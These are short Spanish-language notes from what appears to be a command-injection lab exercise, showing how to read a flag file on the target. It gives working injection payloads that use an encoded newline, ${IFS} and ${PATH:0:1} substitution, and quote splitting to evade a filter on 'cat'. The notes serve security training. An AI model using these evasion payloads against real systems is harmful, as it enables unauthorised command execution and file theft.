## Ejemplo practico

Usa lo que sabes para obtener la /home/1nj3c70r/flag.txt

1. Sabiendo que el payload `127.0.0.1%0a${IFS}{ls,${PATH:0:1}home}` funciono vamos a usar ahora:

```
127.0.0.1%0a${IFS}{cat,${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt}
```

![[Pasted image 20260723150800.png]]

2. Sabiendo que todo lo demas funciona pero hemos cambiado cat por ls puede que este filtrado el comando cat por lo que usaremos `'`

```
127.0.0.1%0a${IFS}{c'a't,${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt}
```
